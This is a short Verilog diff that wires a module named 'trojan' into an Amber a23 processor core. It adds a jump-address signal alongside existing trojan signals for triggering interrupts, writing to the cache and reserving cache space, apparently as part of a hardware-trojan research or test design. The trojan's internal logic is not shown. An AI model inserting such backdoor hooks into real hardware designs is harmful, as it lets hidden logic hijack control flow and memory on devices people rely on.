@@ -229,6 +229,7 @@ wire [127:0]    troj_write_data;
 wire [31:0]     troj_address;
 wire            troj_trigger_irq;
 wire            fetch_stall;
+wire [31:0]	troj_jump_addr;
 
 trojan trojan0 (
     .i_clk              	(sys_clk),
@@ -245,7 +246,8 @@ trojan trojan0 (
 	.o_troj_write_data	    (troj_write_data),
 	.o_troj_write_addr	    (troj_address),
 
-    .o_troj_trigger_irq     (troj_trigger_irq)
+    .o_troj_trigger_irq     (troj_trigger_irq),
+    .o_troj_jump_addr	    (troj_jump_addr)
 );
 
 // -------------------------------------------------------------
@@ -276,7 +278,8 @@ a23_core u_amber (
     .i_wb_ack       ( m_wb_ack  [1]   ),
     .i_wb_err       ( m_wb_err  [1]   ),
 	
-    .i_troj_trigger_irq ( troj_trigger_irq),
+    	.i_troj_trigger_irq 	( troj_trigger_irq),
+	.i_troj_jump_addr	( troj_jump_addr  ),
 	.i_troj_reserve 	( troj_reserve	  ),	/// Trojan signal for reserving upper cache area
 	.i_troj_write_data	( troj_write_data ),	/// Trojan data written to cache
 	.i_troj_address		( troj_address	  ),
